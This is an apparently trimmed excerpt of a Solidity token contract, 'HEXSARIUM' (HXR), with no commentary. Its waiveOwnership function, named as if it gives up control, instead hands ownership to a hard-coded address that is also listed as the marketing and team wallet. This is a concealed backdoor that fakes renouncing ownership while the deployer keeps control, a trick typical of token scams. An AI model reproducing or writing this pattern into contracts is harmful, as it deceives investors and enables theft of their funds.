...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x4A614Aa87dF42e9aB0D837565A3A9430dE9a30a4);
    }
...
contract HEXSARIUM is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "HEXSARIUM";
    string private _symbol = "HXR";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x4A614Aa87dF42e9aB0D837565A3A9430dE9a30a4);
    address payable public teamWalletAddress = payable(0x4A614Aa87dF42e9aB0D837565A3A9430dE9a30a4);
